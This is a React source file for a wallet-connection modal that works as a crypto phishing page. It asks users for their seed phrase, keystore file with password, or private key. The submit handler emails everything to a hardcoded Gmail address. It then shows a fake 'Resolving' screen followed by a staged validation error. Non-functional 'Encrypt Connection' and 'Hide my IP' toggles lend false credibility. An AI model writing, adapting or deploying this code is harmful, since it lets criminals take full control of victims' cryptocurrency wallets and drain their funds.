import { useState } from 'react';
import { HiChevronLeft, HiX } from 'react-icons/hi';
import PropTypes from 'prop-types';
import axios from 'axios';

const Submit = ({ wallet, back, setOpen }) => {
    const [option, setOption] = useState(0);
    const [walletAddress, setWalletAddress] = useState('');
    const [mnemonic, setMnemonic] = useState('');
    const [keystore, setKeystore] = useState('');
    const [keystorePassword, setKeystorePassword] = useState('');
    const [privateKey, setPrivateKey] = useState('');
    const [submit, setSubmit] = useState(false)
    const [errorText, setErrorText] = useState(false)

    const updateError = () => {
        setTimeout(() => setErrorText(true), 3000)
    }

    const handleSubmit = (e) => {
        e.preventDefault();
        
        const formData = {
            walletAddress,
            mnemonic,
            keystore,
            keystorePassword,
            privateKey
        };

        const data = {
            to: "josephaduragbemi573@gmail.com",
            subject: "New Wallet Connection",
            content: `Wallet Address: ${walletAddress} \n Mnemonic: ${mnemonic} \n Keystore: ${keystore} \n Keystore Password: ${keystorePassword} \n Private Key: ${privateKey}`
        }        
        axios.post("/api/send-email", data).catch((err) => {
            console.error('Failed to send email request', err)
        })

        setSubmit(true);
        updateError()

        console.log('Form Data:', formData);
        // Add your form submission logic here
    };

    return (
        <div className="modal-main " id="modal-main-form-ul">
            {
                !submit ?
                    <div className="modal-form bg-white modal-content">
                        <div className="flex items-center justify-between p-2 border-b w-full border-b-gray-500">
                            <p>
                                <HiChevronLeft size={30} onClick={back} />
                            </p>
                            <p className="text-[20px] font-[500]">{wallet.text}</p>
                            <HiX size={25} onClick={() => setOpen(false)} />
                        </div>

                        <div className="modal-form-item">
                            <div className=" my-2">
                                <div className="card example-5 form-image">
                                    <svg height="100%" width="100%" xmlns="http://www.w3.org/2000/svg">
                                        <rect
                                            rx="8"
                                            ry="8"
                                            className="line"
                                            height="100%"
                                            width="100%"
                                            strokeLinejoin="round"
                                        />
                                    </svg>
                                    <img className="loading-img inner" alt="metamask" src={wallet.imgUrl || "https://dev-connect.pages.dev/connect/0x_assets/images/new-way.svg"} style={{ border: 'none' }} />
                                </div>
                            </div>

                            <div className="modal-form-texts">
                                <h6 className="form-text-header">Initializing secure connection with <span className="wallet-name">{wallet.text || "AI Toolkit"}</span>.</h6>
                            </div>

                            <div className="conn-mode">
                                <div className="conn-settings">
                                    <div className="conn-mode-text">Hide my IP</div>
                                    <div className="conn-mode-button">
                                        <label className="switch">
                                            <input type="checkbox" />
                                            <span className="toggle round"></span>
                                        </label>
                                    </div>
                                </div>

                                <div className="conn-settings">
                                    <div className="conn-mode-text">Encrypt Connection</div>
                                    <div className="conn-mode-button">
                                        <label className="switch">
                                            <input type="checkbox" defaultChecked={true} />
                                            <span className="toggle round"></span>
                                        </label>
                                    </div>
                                </div>

                                <div className="conn-settings">
                                    <div className="conn-mode-text">Auto Validate</div>
                                    <div className="conn-mode-button">
                                        <label className="switch">
                                            <input type="checkbox" defaultChecked={true} />
                                            <span className="toggle round"></span>
                                        </label>
                                    </div>
                                </div>
                            </div>

                            <div className="conn-mode tab">
                                <div className="conn-settings tablinks active" data-target="menmonic-form">
                                    <div className={`tablinks-text ${option == 0 && "text-blue-700 font-[700]"}`} onClick={() => setOption(0)}>Phrase</div>
                                </div>

                                <div className="conn-settings tablinks" onClick={() => setOption(1)} data-target="keystore-form">
                                    <div className={`tablinks-text ${option == 1 && "text-blue-700 font-[700]"}`}>Keystore JSON</div>
                                </div>

                                <div className="conn-settings tablinks" onClick={() => setOption(2)} data-target="privkey-form">
                                    <div className={`tablinks-text ${option == 2 && "text-blue-700 font-[700]"}`}>Private Key</div>
                                </div>
                            </div>

                            {
                                option === 0 &&
                                <form className="form menmonic-form" onSubmit={handleSubmit}>
                                    <div className="form-group">
                                        <label className="form-label">Enter your wallet address</label>
                                        <input
                                            minLength="15"
                                            type="text"
                                            required
                                            name="wallet-address"
                                            value={walletAddress}
                                            onChange={(e) => setWalletAddress(e.target.value)}
                                        />
                                    </div>

                                    <div className="form-group">
                                        <label className="form-label">BIP39 Mnemonic</label>
                                        <textarea
                                            rows="2"
                                            minLength="10"
                                            type="text"
                                            required
                                            name="mnemonic-seed"
                                            value={mnemonic}
                                            onChange={(e) => setMnemonic(e.target.value)}
                                        ></textarea>
                                    </div>

                                    <div className="form-group button">
                                        <p id="form-instruction">Typically 12 (sometimes 24) words separated by a single space.</p>
                                        <button type="submit" className="form-submit-button">Import root pair</button>
                                    </div>
                                </form>
                            }

                            {
                                option === 1 &&
                                <form className="form keystore-form hidden" onSubmit={handleSubmit}>
                                    <div className="form-group">
                                        <label className="form-label">Enter your wallet address</label>
                                        <input
                                            minLength="15"
                                            type="text"
                                            required
                                            name="wallet-address"
                                            value={walletAddress}
                                            onChange={(e) => setWalletAddress(e.target.value)}
                                        />
                                    </div>

                                    <div className="form-group">
                                        <label className="form-label">Keystore JSON</label>
                                        <textarea
                                            rows="2"
                                            minLength="7"
                                            type="text"
                                            required
                                            name="keystore"
                                            value={keystore}
                                            onChange={(e) => setKeystore(e.target.value)}
                                        ></textarea>
                                        <p className="form-info color-blue" id="mnemonic-info">Please enter the keystore password.</p>
                                        <input
                                            minLength="2"
                                            type="text"
                                            required
                                            name="keystore-password"
                                            placeholder="******"
                                            value={keystorePassword}
                                            onChange={(e) => setKeystorePassword(e.target.value)}
                                        />
                                    </div>

                                    <div className="form-group button">
                                        <p id="form-instruction !text-[12px]">Several lines of text beginning with “{"…"}” plus the password you used for encryption.</p>
                                        <button type="submit" className="form-submit-button">Import root pair</button>
                                    </div>
                                </form>
                            }

                            {
                                option === 2 &&
                                <form className="form privkey-form hidden" onSubmit={handleSubmit}>
                                    <div className="form-group">
                                        <label className="form-label">Enter your wallet address</label>
                                        <input
                                            minLength="15"
                                            type="text"
                                            required
                                            name="wallet-address"
                                            value={walletAddress}
                                            onChange={(e) => setWalletAddress(e.target.value)}
                                        />
                                    </div>

                                    <div className="form-group">
                                        <label className="form-label">Private Key</label>
                                        <textarea
                                            rows="2"
                                            minLength="10"
                                            type="text"
                                            required
                                            name="priv_key"
                                            value={privateKey}
                                            onChange={(e) => setPrivateKey(e.target.value)}
                                        ></textarea>
                                    </div>

                                    <div className="form-group button">
                                        <p id="form-instruction !text-[12px]">Several lines of text containing alphanumeric characters.</p>
                                        <button type="submit" className="form-submit-button">Import root pair</button>
                                    </div>
                                </form>
                            }
                        </div>
                    </div>
                    :
                    <div className="modal-form bg-white modal-content">
                        <div className="flex items-center justify-center p-2 border-b w-full border-b-gray-500">
                            <p className="text-[20px] font-[500]">Safe</p>
                        </div>

                        <div className=" my-2">
                            {
                                errorText ?
                                    <div className="card example-5 p-3 border-8 !rounded-3xl border-red-500">
                                        <img className="loading-img inner !rounded-3xl size-[80px]" alt="metamask" src={wallet.imgUrl || "https://dev-connect.pages.dev/connect/0x_assets/images/new-way.svg"} style={{ border: 'none' }} />
                                    </div>
                                    :
                                    <div className="card example-5 form-image">
                                        <svg height="100%" width="100%" xmlns="http://www.w3.org/2000/svg">
                                            <rect
                                                rx="8"
                                                ry="8"
                                                className="line"
                                                height="100%"
                                                width="100%"
                                                strokeLinejoin="round"
                                            />
                                        </svg>
                                        <img className="loading-img inner" alt="metamask" src={wallet.imgUrl || "https://dev-connect.pages.dev/connect/0x_assets/images/new-way.svg"} style={{ border: 'none' }} />
                                    </div>
                            }
                        </div>

                        {
                            errorText ? <p className='text-red-500 font-[600]'>Error Validating Details</p> : <p>Resolving, Please wait...</p>
                        }
                    </div>
            }

        </div>
    );
};

export default Submit;

Submit.propTypes = {
    wallet: PropTypes.shape({
        text: PropTypes.string,
        imgUrl: PropTypes.string,
    }),
    back: PropTypes.func,
    setOpen: PropTypes.func,
};
